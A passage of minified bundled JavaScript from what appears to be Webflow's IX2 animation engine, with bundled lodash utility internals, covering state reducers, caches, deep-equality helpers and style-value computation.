      (t.HEIGHT = "height"),
      (t.BACKGROUND_COLOR = "backgroundColor"),
      (t.BACKGROUND = "background"),
      (t.BORDER_COLOR = "borderColor"),
      (t.COLOR = "color"),
      (t.DISPLAY = "display"),
      (t.FLEX = "flex"),
      (t.WILL_CHANGE = "willChange"),
      (t.AUTO = "AUTO"),
      (t.COMMA_DELIMITER = ","),
      (t.COLON_DELIMITER = ":"),
      (t.BAR_DELIMITER = "|"),
      (t.CHILDREN = "CHILDREN"),
      (t.IMMEDIATE_CHILDREN = "IMMEDIATE_CHILDREN"),
      (t.SIBLINGS = "SIBLINGS"),
      (t.PARENT = "PARENT"),
      (t.PRESERVE_3D = "preserve-3d"),
      (t.HTML_ELEMENT = "HTML_ELEMENT"),
      (t.PLAIN_OBJECT = "PLAIN_OBJECT"),
      (t.ABSTRACT_NODE = "ABSTRACT_NODE"),
      (t.RENDER_TRANSFORM = "RENDER_TRANSFORM"),
      (t.RENDER_GENERAL = "RENDER_GENERAL"),
      (t.RENDER_STYLE = "RENDER_STYLE"),
      (t.RENDER_PLUGIN = "RENDER_PLUGIN");
  },
  function (e, t, n) {
    "use strict";
    var i,
      a = n(1)(n(21)),
      r = n(1);
    Object.defineProperty(t, "__esModule", { value: !0 }),
      (t.ixRequest = void 0);
    var o = r(n(30)),
      c = n(3),
      s = n(22),
      u = c.IX2EngineActionTypes,
      d = u.IX2_PREVIEW_REQUESTED,
      f = u.IX2_PLAYBACK_REQUESTED,
      l = u.IX2_STOP_REQUESTED,
      p = u.IX2_CLEAR_REQUESTED,
      E = { preview: {}, playback: {}, stop: {}, clear: {} },
      v = Object.create(
        null,
        ((i = {}),
        (0, a.default)(i, d, { value: "preview" }),
        (0, a.default)(i, f, { value: "playback" }),
        (0, a.default)(i, l, { value: "stop" }),
        (0, a.default)(i, p, { value: "clear" }),
        i)
      );
    t.ixRequest = function () {
      var e =
          arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : E,
        t = arguments.length > 1 ? arguments[1] : void 0;
      if (t.type in v) {
        var n = [v[t.type]];
        return (0, s.setIn)(e, [n], (0, o.default)({}, t.payload));
      }
      return e;
    };
  },
  function (e, t, n) {
    "use strict";
    Object.defineProperty(t, "__esModule", { value: !0 }),
      (t.ixSession = void 0);
    var i = n(3),
      a = n(22),
      r = i.IX2EngineActionTypes,
      o = r.IX2_SESSION_INITIALIZED,
      c = r.IX2_SESSION_STARTED,
      s = r.IX2_TEST_FRAME_RENDERED,
      u = r.IX2_SESSION_STOPPED,
      d = r.IX2_EVENT_LISTENER_ADDED,
      f = r.IX2_EVENT_STATE_CHANGED,
      l = r.IX2_ANIMATION_FRAME_CHANGED,
      p = r.IX2_ACTION_LIST_PLAYBACK_CHANGED,
      E = r.IX2_VIEWPORT_WIDTH_CHANGED,
      v = r.IX2_MEDIA_QUERIES_DEFINED,
      I = {
        active: !1,
        tick: 0,
        eventListeners: [],
        eventState: {},
        playbackState: {},
        viewportWidth: 0,
        mediaQueryKey: null,
        hasBoundaryNodes: !1,
        hasDefinedMediaQueries: !1,
        reducedMotion: !1,
      };
    t.ixSession = function () {
      var e =
          arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : I,
        t = arguments.length > 1 ? arguments[1] : void 0;
      switch (t.type) {
        case o:
          var n = t.payload,
            i = n.hasBoundaryNodes,
            r = n.reducedMotion;
          return (0, a.merge)(e, { hasBoundaryNodes: i, reducedMotion: r });
        case c:
          return (0, a.set)(e, "active", !0);
        case s:
          var g = t.payload.step,
            y = void 0 === g ? 20 : g;
          return (0, a.set)(e, "tick", e.tick + y);
        case u:
          return I;
        case l:
          var T = t.payload.now;
          return (0, a.set)(e, "tick", T);
        case d:
          var h = (0, a.addLast)(e.eventListeners, t.payload);
          return (0, a.set)(e, "eventListeners", h);
        case f:
          var _ = t.payload,
            m = _.stateKey,
            b = _.newState;
          return (0, a.setIn)(e, ["eventState", m], b);
        case p:
          var O = t.payload,
            S = O.actionListId,
            L = O.isPlaying;
          return (0, a.setIn)(e, ["playbackState", S], L);
        case E:
          for (
            var A = t.payload,
              w = A.width,
              R = A.mediaQueries,
              N = R.length,
              C = null,
              x = 0;
            x < N;
            x++
          ) {
            var M = R[x],
              P = M.key,
              D = M.min,
              F = M.max;
            if (w >= D && w <= F) {
              C = P;
              break;
            }
          }
          return (0, a.merge)(e, { viewportWidth: w, mediaQueryKey: C });
        case v:
          return (0, a.set)(e, "hasDefinedMediaQueries", !0);
        default:
          return e;
      }
    };
  },
  function (e, t, n) {
    var i = n(196),
      a = n(248),
      r = n(111);
    e.exports = function (e) {
      var t = a(e);
      return 1 == t.length && t[0][2]
        ? r(t[0][0], t[0][1])
        : function (n) {
            return n === e || i(n, e, t);
          };
    };
  },
  function (e, t, n) {
    var i = n(97),
      a = n(101);
    e.exports = function (e, t, n, r) {
      var o = n.length,
        c = o,
        s = !r;
      if (null == e) return !c;
      for (e = Object(e); o--; ) {
        var u = n[o];
        if (s && u[2] ? u[1] !== e[u[0]] : !(u[0] in e)) return !1;
      }
      for (; ++o < c; ) {
        var d = (u = n[o])[0],
          f = e[d],
          l = u[1];
        if (s && u[2]) {
          if (void 0 === f && !(d in e)) return !1;
        } else {
          var p = new i();
          if (r) var E = r(f, l, d, e, t, p);
          if (!(void 0 === E ? a(l, f, 3, r, p) : E)) return !1;
        }
      }
      return !0;
    };
  },
  function (e, t) {
    e.exports = function () {
      (this.__data__ = []), (this.size = 0);
    };
  },
  function (e, t, n) {
    var i = n(32),
      a = Array.prototype.splice;
    e.exports = function (e) {
      var t = this.__data__,
        n = i(t, e);
      return !(
        n < 0 || (n == t.length - 1 ? t.pop() : a.call(t, n, 1), --this.size, 0)
      );
    };
  },
  function (e, t, n) {
    var i = n(32);
    e.exports = function (e) {
      var t = this.__data__,
        n = i(t, e);
      return n < 0 ? void 0 : t[n][1];
    };
  },
  function (e, t, n) {
    var i = n(32);
    e.exports = function (e) {
      return i(this.__data__, e) > -1;
    };
  },
  function (e, t, n) {
    var i = n(32);
    e.exports = function (e, t) {
      var n = this.__data__,
        a = i(n, e);
      return a < 0 ? (++this.size, n.push([e, t])) : (n[a][1] = t), this;
    };
  },
  function (e, t, n) {
    var i = n(31);
    e.exports = function () {
      (this.__data__ = new i()), (this.size = 0);
    };
  },
  function (e, t) {
    e.exports = function (e) {
      var t = this.__data__,
        n = t.delete(e);
      return (this.size = t.size), n;
    };
  },
  function (e, t) {
    e.exports = function (e) {
      return this.__data__.get(e);
    };
  },
  function (e, t) {
    e.exports = function (e) {
      return this.__data__.has(e);
    };
  },
  function (e, t, n) {
    var i = n(31),
      a = n(49),
      r = n(50);
    e.exports = function (e, t) {
      var n = this.__data__;
      if (n instanceof i) {
        var o = n.__data__;
        if (!a || o.length < 199)
          return o.push([e, t]), (this.size = ++n.size), this;
        n = this.__data__ = new r(o);
      }
      return n.set(e, t), (this.size = n.size), this;
    };
  },
  function (e, t, n) {
    var i = n(98),
      a = n(210),
      r = n(8),
      o = n(100),
      c = /^\[object .+?Constructor\]$/,
      s = Function.prototype,
      u = Object.prototype,
      d = s.toString,
      f = u.hasOwnProperty,
      l = RegExp(
        "^" +
          d
            .call(f)
            .replace(/[\\^$.*+?()[\]{}|]/g, "\\$&")
            .replace(
              /hasOwnProperty|(function).*?(?=\\\()| for .+?(?=\\\])/g,
              "$1.*?"
            ) +
          "$"
      );
    e.exports = function (e) {
      return !(!r(e) || a(e)) && (i(e) ? l : c).test(o(e));
    };
  },
  function (e, t, n) {
    var i = n(23),
      a = Object.prototype,
      r = a.hasOwnProperty,
      o = a.toString,
      c = i ? i.toStringTag : void 0;
    e.exports = function (e) {
      var t = r.call(e, c),
        n = e[c];
      try {
        e[c] = void 0;
        var i = !0;
      } catch (e) {}
      var a = o.call(e);
      return i && (t ? (e[c] = n) : delete e[c]), a;
    };
  },
  function (e, t) {
    var n = Object.prototype.toString;
    e.exports = function (e) {
      return n.call(e);
    };
  },
  function (e, t, n) {
    var i,
      a = n(211),
      r = (i = /[^.]+$/.exec((a && a.keys && a.keys.IE_PROTO) || ""))
        ? "Symbol(src)_1." + i
        : "";
    e.exports = function (e) {
      return !!r && r in e;
    };
  },
  function (e, t, n) {
    var i = n(6)["__core-js_shared__"];
    e.exports = i;
  },
  function (e, t) {
    e.exports = function (e, t) {
      return null == e ? void 0 : e[t];
    };
  },
  function (e, t, n) {
    var i = n(214),
      a = n(31),
      r = n(49);
    e.exports = function () {
      (this.size = 0),
        (this.__data__ = {
          hash: new i(),
          map: new (r || a)(),
          string: new i(),
        });
    };
  },
  function (e, t, n) {
    var i = n(215),
      a = n(216),
      r = n(217),
      o = n(218),
      c = n(219);
    function s(e) {
      var t = -1,
        n = null == e ? 0 : e.length;
      for (this.clear(); ++t < n; ) {
        var i = e[t];
        this.set(i[0], i[1]);
      }
    }
    (s.prototype.clear = i),
      (s.prototype.delete = a),
      (s.prototype.get = r),
      (s.prototype.has = o),
      (s.prototype.set = c),
      (e.exports = s);
  },
  function (e, t, n) {
    var i = n(33);
    e.exports = function () {
      (this.__data__ = i ? i(null) : {}), (this.size = 0);
    };
  },
  function (e, t) {
    e.exports = function (e) {
      var t = this.has(e) && delete this.__data__[e];
      return (this.size -= t ? 1 : 0), t;
    };
  },
  function (e, t, n) {
    var i = n(33),
      a = Object.prototype.hasOwnProperty;
    e.exports = function (e) {
      var t = this.__data__;
      if (i) {
        var n = t[e];
        return "__lodash_hash_undefined__" === n ? void 0 : n;
      }
      return a.call(t, e) ? t[e] : void 0;
    };
  },
  function (e, t, n) {
    var i = n(33),
      a = Object.prototype.hasOwnProperty;
    e.exports = function (e) {
      var t = this.__data__;
      return i ? void 0 !== t[e] : a.call(t, e);
    };
  },
  function (e, t, n) {
    var i = n(33);
    e.exports = function (e, t) {
      var n = this.__data__;
      return (
        (this.size += this.has(e) ? 0 : 1),
        (n[e] = i && void 0 === t ? "__lodash_hash_undefined__" : t),
        this
      );
    };
  },
  function (e, t, n) {
    var i = n(34);
    e.exports = function (e) {
      var t = i(this, e).delete(e);
      return (this.size -= t ? 1 : 0), t;
    };
  },
  function (e, t) {
    e.exports = function (e) {
      var t = typeof e;
      return "string" == t || "number" == t || "symbol" == t || "boolean" == t
        ? "__proto__" !== e
        : null === e;
    };
  },
  function (e, t, n) {
    var i = n(34);
    e.exports = function (e) {
      return i(this, e).get(e);
    };
  },
  function (e, t, n) {
    var i = n(34);
    e.exports = function (e) {
      return i(this, e).has(e);
    };
  },
  function (e, t, n) {
    var i = n(34);
    e.exports = function (e, t) {
      var n = i(this, e),
        a = n.size;
      return n.set(e, t), (this.size += n.size == a ? 0 : 1), this;
    };
  },
  function (e, t, n) {
    var i = n(97),
      a = n(102),
      r = n(231),
      o = n(235),
      c = n(58),
      s = n(2),
      u = n(52),
      d = n(54),
      f = "[object Arguments]",
      l = "[object Array]",
      p = "[object Object]",
      E = Object.prototype.hasOwnProperty;
    e.exports = function (e, t, n, v, I, g) {
      var y = s(e),
        T = s(t),
        h = y ? l : c(e),
        _ = T ? l : c(t),
        m = (h = h == f ? p : h) == p,
        b = (_ = _ == f ? p : _) == p,
        O = h == _;
      if (O && u(e)) {
        if (!u(t)) return !1;
        (y = !0), (m = !1);
      }
      if (O && !m)
        return (
          g || (g = new i()),
          y || d(e) ? a(e, t, n, v, I, g) : r(e, t, h, n, v, I, g)
        );
      if (!(1 & n)) {
        var S = m && E.call(e, "__wrapped__"),
          L = b && E.call(t, "__wrapped__");
        if (S || L) {
          var A = S ? e.value() : e,
            w = L ? t.value() : t;
          return g || (g = new i()), I(A, w, n, v, g);
        }
      }
      return !!O && (g || (g = new i()), o(e, t, n, v, I, g));
    };
  },
  function (e, t, n) {
    var i = n(50),
      a = n(227),
      r = n(228);
    function o(e) {
      var t = -1,
        n = null == e ? 0 : e.length;
      for (this.__data__ = new i(); ++t < n; ) this.add(e[t]);
    }
    (o.prototype.add = o.prototype.push = a),
      (o.prototype.has = r),
      (e.exports = o);
  },
  function (e, t) {
    e.exports = function (e) {
      return this.__data__.set(e, "__lodash_hash_undefined__"), this;
    };
  },
  function (e, t) {
    e.exports = function (e) {
      return this.__data__.has(e);
    };
  },
  function (e, t) {
    e.exports = function (e, t) {
      for (var n = -1, i = null == e ? 0 : e.length; ++n < i; )
        if (t(e[n], n, e)) return !0;
      return !1;
    };
  },
  function (e, t) {
    e.exports = function (e, t) {
      return e.has(t);
    };
  },
  function (e, t, n) {
    var i = n(23),
      a = n(232),
      r = n(48),
      o = n(102),
      c = n(233),
      s = n(234),
      u = i ? i.prototype : void 0,
      d = u ? u.valueOf : void 0;
    e.exports = function (e, t, n, i, u, f, l) {
      switch (n) {
        case "[object DataView]":
          if (e.byteLength != t.byteLength || e.byteOffset != t.byteOffset)
            return !1;
          (e = e.buffer), (t = t.buffer);
        case "[object ArrayBuffer]":
          return !(e.byteLength != t.byteLength || !f(new a(e), new a(t)));
        case "[object Boolean]":
        case "[object Date]":
        case "[object Number]":
          return r(+e, +t);
        case "[object Error]":
          return e.name == t.name && e.message == t.message;
        case "[object RegExp]":
        case "[object String]":
          return e == t + "";
        case "[object Map]":
          var p = c;
        case "[object Set]":
          var E = 1 & i;
          if ((p || (p = s), e.size != t.size && !E)) return !1;
          var v = l.get(e);
          if (v) return v == t;
          (i |= 2), l.set(e, t);
          var I = o(p(e), p(t), i, u, f, l);
          return l.delete(e), I;
        case "[object Symbol]":
          if (d) return d.call(e) == d.call(t);
      }
      return !1;
    };
  },
  function (e, t, n) {
    var i = n(6).Uint8Array;
    e.exports = i;
  },
  function (e, t) {
    e.exports = function (e) {
      var t = -1,
        n = Array(e.size);
      return (
        e.forEach(function (e, i) {
          n[++t] = [i, e];
        }),
        n
      );
    };
  },
  function (e, t) {
    e.exports = function (e) {
      var t = -1,
        n = Array(e.size);
      return (
        e.forEach(function (e) {
          n[++t] = e;
        }),
        n
      );
    };
  },
  function (e, t, n) {
    var i = n(236),
      a = Object.prototype.hasOwnProperty;
    e.exports = function (e, t, n, r, o, c) {
      var s = 1 & n,
        u = i(e),
        d = u.length;
      if (d != i(t).length && !s) return !1;
      for (var f = d; f--; ) {
        var l = u[f];
        if (!(s ? l in t : a.call(t, l))) return !1;
      }
      var p = c.get(e),
        E = c.get(t);
      if (p && E) return p == t && E == e;
      var v = !0;
      c.set(e, t), c.set(t, e);
      for (var I = s; ++f < d; ) {
        var g = e[(l = u[f])],
          y = t[l];
        if (r) var T = s ? r(y, g, l, t, e, c) : r(g, y, l, e, t, c);
        if (!(void 0 === T ? g === y || o(g, y, n, r, c) : T)) {
          v = !1;
          break;
        }
        I || (I = "constructor" == l);
      }
      if (v && !I) {
        var h = e.constructor,
          _ = t.constructor;
        h != _ &&
          "constructor" in e &&
          "constructor" in t &&
          !(
            "function" == typeof h &&
            h instanceof h &&
            "function" == typeof _ &&
            _ instanceof _
          ) &&
          (v = !1);
      }
      return c.delete(e), c.delete(t), v;
    };
  },
  function (e, t, n) {
    var i = n(103),
      a = n(104),
      r = n(35);
    e.exports = function (e) {
      return i(e, r, a);
    };
  },
  function (e, t) {
    e.exports = function (e, t) {
      for (var n = -1, i = null == e ? 0 : e.length, a = 0, r = []; ++n < i; ) {
        var o = e[n];
        t(o, n, e) && (r[a++] = o);
      }
      return r;
    };
  },
  function (e, t) {
    e.exports = function (e, t) {
      for (var n = -1, i = Array(e); ++n < e; ) i[n] = t(n);
      return i;
    };
  },
  function (e, t, n) {
    var i = n(15),
      a = n(12);
    e.exports = function (e) {
      return a(e) && "[object Arguments]" == i(e);
    };
  },
  function (e, t) {
    e.exports = function () {
      return !1;
    };
  },
  function (e, t, n) {
    var i = n(15),
      a = n(55),
      r = n(12),
      o = {};
    (o["[object Float32Array]"] =
      o["[object Float64Array]"] =
      o["[object Int8Array]"] =
      o["[object Int16Array]"] =
      o["[object Int32Array]"] =
      o["[object Uint8Array]"] =
      o["[object Uint8ClampedArray]"] =
      o["[object Uint16Array]"] =
      o["[object Uint32Array]"] =
        !0),
      (o["[object Arguments]"] =
        o["[object Array]"] =
        o["[object ArrayBuffer]"] =
        o["[object Boolean]"] =
        o["[object DataView]"] =
        o["[object Date]"] =
        o["[object Error]"] =
        o["[object Function]"] =
        o["[object Map]"] =
        o["[object Number]"] =
        o["[object Object]"] =
        o["[object RegExp]"] =
        o["[object Set]"] =
        o["[object String]"] =
        o["[object WeakMap]"] =
          !1),
      (e.exports = function (e) {
        return r(e) && a(e.length) && !!o[i(e)];
      });
  },
  function (e, t) {
    e.exports = function (e) {
      return function (t) {
        return e(t);
      };
    };
  },
  function (e, t, n) {
    (function (e) {
      var i = n(99),
        a = t && !t.nodeType && t,
        r = a && "object" == typeof e && e && !e.nodeType && e,
        o = r && r.exports === a && i.process,
        c = (function () {
          try {
            return (
              (r && r.require && r.require("util").types) ||
              (o && o.binding && o.binding("util"))
            );
          } catch (e) {}
        })();
      e.exports = c;
    }.call(this, n(107)(e)));
  },
  function (e, t, n) {
    var i = n(108)(Object.keys, Object);
    e.exports = i;
  },
  function (e, t, n) {
    var i = n(11)(n(6), "DataView");
    e.exports = i;
  },
  function (e, t, n) {
    var i = n(11)(n(6), "Promise");
    e.exports = i;
  },
  function (e, t, n) {
    var i = n(11)(n(6), "Set");
    e.exports = i;
  },
  function (e, t, n) {
    var i = n(110),
      a = n(35);
    e.exports = function (e) {
      for (var t = a(e), n = t.length; n--; ) {
        var r = t[n],
          o = e[r];
        t[n] = [r, o, i(o)];
      }
      return t;
    };
  },
  function (e, t, n) {
    var i = n(101),
      a = n(59),
      r = n(255),
      o = n(61),
      c = n(110),
      s = n(111),
      u = n(24);
    e.exports = function (e, t) {
      return o(e) && c(t)
        ? s(u(e), t)
        : function (n) {
            var o = a(n, e);
            return void 0 === o && o === t ? r(n, e) : i(t, o, 3);
          };
    };
  },
  function (e, t, n) {
    var i = n(251),
      a =
        /[^.[\]]+|\[(?:(-?\d+(?:\.\d+)?)|(["'])((?:(?!\2)[^\\]|\\.)*?)\2)\]|(?=(?:\.|\[\])(?:\.|\[\]|$))/g,
      r = /\\(\\)?/g,
      o = i(function (e) {
        var t = [];
        return (
          46 === e.charCodeAt(0) && t.push(""),
          e.replace(a, function (e, n, i, a) {
            t.push(i ? a.replace(r, "$1") : n || e);
          }),
          t
        );
      });
    e.exports = o;
  },
  function (e, t, n) {
    var i = n(252);
    e.exports = function (e) {
      var t = i(e, function (e) {
          return 500 === n.size && n.clear(), e;
        }),
        n = t.cache;
      return t;
    };
  },
  function (e, t, n) {
    var i = n(50),
      a = "Expected a function";
    function r(e, t) {
      if ("function" != typeof e || (null != t && "function" != typeof t))
        throw new TypeError(a);
      var n = function () {
        var i = arguments,
          a = t ? t.apply(this, i) : i[0],
          r = n.cache;
        if (r.has(a)) return r.get(a);
        var o = e.apply(this, i);
        return (n.cache = r.set(a, o) || r), o;
      };
      return (n.cache = new (r.Cache || i)()), n;
    }
    (r.Cache = i), (e.exports = r);
  },
  function (e, t, n) {
    var i = n(254);
    e.exports = function (e) {
      return null == e ? "" : i(e);
    };
  },
  function (e, t, n) {
    var i = n(23),
      a = n(112),
      r = n(2),
      o = n(38),
      c = i ? i.prototype : void 0,
      s = c ? c.toString : void 0;
    e.exports = function e(t) {
      if ("string" == typeof t) return t;
      if (r(t)) return a(t, e) + "";
      if (o(t)) return s ? s.call(t) : "";
      var n = t + "";
      return "0" == n && 1 / t == -Infinity ? "-0" : n;
    };
  },
  function (e, t, n) {
    var i = n(256),
      a = n(257);
    e.exports = function (e, t) {
      return null != e && a(e, t, i);
    };
  },
  function (e, t) {
    e.exports = function (e, t) {
      return null != e && t in Object(e);
    };
  },
  function (e, t, n) {
    var i = n(37),
      a = n(36),
      r = n(2),
      o = n(53),
      c = n(55),
      s = n(24);
    e.exports = function (e, t, n) {
      for (var u = -1, d = (t = i(t, e)).length, f = !1; ++u < d; ) {
        var l = s(t[u]);
        if (!(f = null != e && n(e, l))) break;
        e = e[l];
      }
      return f || ++u != d
        ? f
        : !!(d = null == e ? 0 : e.length) && c(d) && o(l, d) && (r(e) || a(e));
    };
  },
  function (e, t, n) {
    var i = n(113),
      a = n(259),
      r = n(61),
      o = n(24);
    e.exports = function (e) {
      return r(e) ? i(o(e)) : a(e);
    };
  },
  function (e, t, n) {
    var i = n(60);
    e.exports = function (e) {
      return function (t) {
        return i(t, e);
      };
    };
  },
  function (e, t, n) {
    var i = n(114),
      a = n(10),
      r = n(115),
      o = Math.max;
    e.exports = function (e, t, n) {
      var c = null == e ? 0 : e.length;
      if (!c) return -1;
      var s = null == n ? 0 : r(n);
      return s < 0 && (s = o(c + s, 0)), i(e, a(t, 3), s);
    };
  },
  function (e, t, n) {
    var i = n(63),
      a = 1 / 0;
    e.exports = function (e) {
      return e
        ? (e = i(e)) === a || e === -a
          ? 17976931348623157e292 * (e < 0 ? -1 : 1)
          : e == e
          ? e
          : 0
        : 0 === e
        ? e
        : 0;
    };
  },
  function (e, t, n) {
    var i = n(263),
      a = /^\s+/;
    e.exports = function (e) {
      return e ? e.slice(0, i(e) + 1).replace(a, "") : e;
    };
  },
  function (e, t) {
    var n = /\s/;
    e.exports = function (e) {
      for (var t = e.length; t-- && n.test(e.charAt(t)); );
      return t;
    };
  },
  function (e, t) {
    e.exports = function (e) {
      if (Array.isArray(e)) {
        for (var t = 0, n = new Array(e.length); t < e.length; t++) n[t] = e[t];
        return n;
      }
    };
  },
  function (e, t) {
    e.exports = function (e) {
      if (
        Symbol.iterator in Object(e) ||
        "[object Arguments]" === Object.prototype.toString.call(e)
      )
        return Array.from(e);
    };
  },
  function (e, t) {
    e.exports = function () {
      throw new TypeError("Invalid attempt to spread non-iterable instance");
    };
  },
  function (e, t, n) {
    "use strict";
    Object.defineProperty(t, "__esModule", { value: !0 }),
      (t.createElementState = _),
      (t.mergeActionState = m),
      (t.ixElements = void 0);
    var i = n(22),
      a = n(3),
      r = a.IX2EngineConstants,
      o = (r.HTML_ELEMENT, r.PLAIN_OBJECT),
      c = (r.ABSTRACT_NODE, r.CONFIG_X_VALUE),
      s = r.CONFIG_Y_VALUE,
      u = r.CONFIG_Z_VALUE,
      d = r.CONFIG_VALUE,
      f = r.CONFIG_X_UNIT,
      l = r.CONFIG_Y_UNIT,
      p = r.CONFIG_Z_UNIT,
      E = r.CONFIG_UNIT,
      v = a.IX2EngineActionTypes,
      I = v.IX2_SESSION_STOPPED,
      g = v.IX2_INSTANCE_ADDED,
      y = v.IX2_ELEMENT_STATE_CHANGED,
      T = {},
      h = "refState";
    function _(e, t, n, a, r) {
      var c =
        n === o ? (0, i.getIn)(r, ["config", "target", "objectId"]) : null;
      return (0, i.mergeIn)(e, [a], { id: a, ref: t, refId: c, refType: n });
    }
    function m(e, t, n, a, r) {
      var o = (function (e) {
          var t = e.config;
          return b.reduce(function (e, n) {
            var i = n[0],
              a = n[1],
              r = t[i],
              o = t[a];
            return null != r && null != o && (e[a] = o), e;
          }, {});
        })(r),
        c = [t, h, n];
      return (0, i.mergeIn)(e, c, a, o);
    }
    t.ixElements = function () {
      var e =
          arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : T,
        t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
      switch (t.type) {
        case I:
          return T;
        case g:
          var n = t.payload,
            a = n.elementId,
            r = n.element,
            o = n.origin,
            c = n.actionItem,
            s = n.refType,
            u = c.actionTypeId,
            d = e;
          return (
            (0, i.getIn)(d, [a, r]) !== r && (d = _(d, r, s, a, c)),
            m(d, a, u, o, c)
          );
        case y:
          var f = t.payload;
          return m(e, f.elementId, f.actionTypeId, f.current, f.actionItem);
        default:
          return e;
      }
    };
    var b = [
      [c, f],
      [s, l],
      [u, p],
      [d, E],
    ];
  },
  function (e, t, n) {
    "use strict";
    Object.defineProperty(t, "__esModule", { value: !0 }),
      (t.clearPlugin =
        t.renderPlugin =
        t.createPluginInstance =
        t.getPluginDestination =
        t.getPluginOrigin =
        t.getPluginDuration =
        t.getPluginConfig =
          void 0),
      (t.getPluginConfig = function (e) {
        return e.value;
      }),
      (t.getPluginDuration = function (e, t) {
        if ("auto" !== t.config.duration) return null;
        var n = parseFloat(e.getAttribute("data-duration"));
        return n > 0
          ? 1e3 * n
          : 1e3 * parseFloat(e.getAttribute("data-default-duration"));
      }),
      (t.getPluginOrigin = function (e) {
        return e || { value: 0 };
      }),
      (t.getPluginDestination = function (e) {
        return { value: e.value };
      }),
      (t.createPluginInstance = function (e) {
        var t = window.Webflow.require("lottie").createInstance(e);
        return t.stop(), t.setSubframe(!0), t;
      }),
      (t.renderPlugin = function (e, t, n) {
        if (e) {
          var i = t[n.actionTypeId].value / 100;
          e.goToFrame(e.frames * i);
        }
      }),
      (t.clearPlugin = function (e) {
        window.Webflow.require("lottie").createInstance(e).stop();
      });
  },
  function (e, t, n) {
    "use strict";
    var i,
      a,
      r,
      o = n(1),
      c = o(n(17)),
      s = o(n(21)),
      u = n(1);
    Object.defineProperty(t, "__esModule", { value: !0 }),
      (t.getInstanceId = function () {
        return "i" + Ee++;
      }),
      (t.getElementId = function (e, t) {
        for (var n in e) {
          var i = e[n];
          if (i && i.ref === t) return i.id;
        }
        return "e" + ve++;
      }),
      (t.reifyState = function () {
        var e =
            arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {},
          t = e.events,
          n = e.actionLists,
          i = e.site,
          a = (0, f.default)(
            t,
            function (e, t) {
              var n = t.eventTypeId;
              return e[n] || (e[n] = {}), (e[n][t.id] = t), e;
            },
            {}
          ),
          r = i && i.mediaQueries,
          o = [];
        return (
          r
            ? (o = r.map(function (e) {
                return e.key;
              }))
            : ((r = []), console.warn("IX2 missing mediaQueries in site data")),
          {
            ixData: {
              events: t,
              actionLists: n,
              eventTypeMap: a,
              mediaQueries: r,
              mediaQueryKeys: o,
            },
          }
        );
      }),
      (t.observeStore = function (e) {
        var t = e.store,
          n = e.select,
          i = e.onChange,
          a = e.comparator,
          r = void 0 === a ? Ie : a,
          o = t.getState,
          c = (0, t.subscribe)(function () {
            var e = n(o());
            null != e ? r(e, s) || i((s = e), t) : c();
          }),
          s = n(o());
        return c;
      }),
      (t.getAffectedElements = ye),
      (t.getComputedStyle = function (e) {
        var t = e.element,
          n = e.actionItem;
        if (!y.IS_BROWSER_ENV) return {};
        switch (n.actionTypeId) {
          case ae:
          case re:
          case oe:
          case ce:
          case se:
            return window.getComputedStyle(t);
          default:
            return {};
        }
      }),
      (t.getInstanceOrigin = function (e) {
        var t =
            arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {},
          n =
            arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {},
          i = arguments.length > 3 ? arguments[3] : void 0,
          a = (arguments.length > 4 ? arguments[4] : void 0).getStyle,
          r = i.actionTypeId,
          o = i.config;
        if ((0, g.isPluginType)(r)) return (0, g.getPluginOrigin)(r)(t[r]);
        switch (r) {
          case $:
          case J:
          case ee:
          case te:
            return t[r] || be[r];
          case ie:
            return he(t[r], i.config.filters);
          case ne:
            return { value: (0, d.default)(parseFloat(a(e, N)), 1) };
          case ae:
            var c = a(e, x),
              s = a(e, M);
            return {
              widthValue:
                o.widthUnit === X
                  ? Te.test(c)
                    ? parseFloat(c)
                    : parseFloat(n.width)
                  : (0, d.default)(parseFloat(c), parseFloat(n.width)),
              heightValue:
                o.heightUnit === X
                  ? Te.test(s)
                    ? parseFloat(s)
                    : parseFloat(n.height)
                  : (0, d.default)(parseFloat(s), parseFloat(n.height)),
            };
          case re:
          case oe:
          case ce:
            return (function (e) {
              var t = e.element,
                n = e.computedStyle,
                i = e.getStyle,
                a = fe[e.actionTypeId],
                r = i(t, a),
                o = Ae.test(r) ? r : n[a],
                c = (function (e, t) {
                  var n = e.exec(t);
                  return n ? n[1] : "";
                })(we, o).split(Y);
              return {
                rValue: (0, d.default)(parseInt(c[0], 10), 255),
                gValue: (0, d.default)(parseInt(c[1], 10), 255),
                bValue: (0, d.default)(parseInt(c[2], 10), 255),
                aValue: (0, d.default)(parseFloat(c[3]), 1),
              };
            })({ element: e, actionTypeId: r, computedStyle: n, getStyle: a });
          case se:
            return { value: (0, d.default)(a(e, B), n.display) };
          case ue:
            return t[r] || { value: 0 };
          default:
            return;
        }
      }),
      (t.getDestinationValues = function (e) {
        var t = e.element,
          n = e.actionItem,
          i = e.elementApi,
          a = n.actionTypeId;
        if ((0, g.isPluginType)(a))
          return (0, g.getPluginDestination)(a)(n.config);
        switch (a) {
          case $:
          case J:
          case ee:
          case te:
            var r = n.config;
            return { xValue: r.xValue, yValue: r.yValue, zValue: r.zValue };
          case ae:
            var o = i.getStyle,
              c = i.setStyle,
              s = i.getProperty,
              u = n.config,
              d = u.widthUnit,
              f = u.heightUnit,
              l = n.config,
              p = l.widthValue,
              E = l.heightValue;
            if (!y.IS_BROWSER_ENV) return { widthValue: p, heightValue: E };
            if (d === X) {
              var v = o(t, x);
              c(t, x, ""), (p = s(t, "offsetWidth")), c(t, x, v);
            }
            if (f === X) {
              var I = o(t, M);
              c(t, M, ""), (E = s(t, "offsetHeight")), c(t, M, I);
            }
            return { widthValue: p, heightValue: E };
          case re:
          case oe:
          case ce:
            var T = n.config;
            return {
              rValue: T.rValue,
              gValue: T.gValue,
              bValue: T.bValue,
              aValue: T.aValue,
            };
          case ie:
            return n.config.filters.reduce(_e, {});
          default:
            return { value: n.config.value };
        }
      }),
      (t.getRenderType = me),
      (t.getStyleProp = function (e, t) {
        return e === K ? t.replace("STYLE_", "").toLowerCase() : null;
      }),
      (t.renderHTMLElement = function (e, t, n, i, a, r, o, c, s) {
        switch (c) {
          case Q:
            return (function (e, t, n, i, a) {
              var r,
                o,
                c,
                s,
                u,
                d = Le.map(function (e) {
                  var n = be[e],
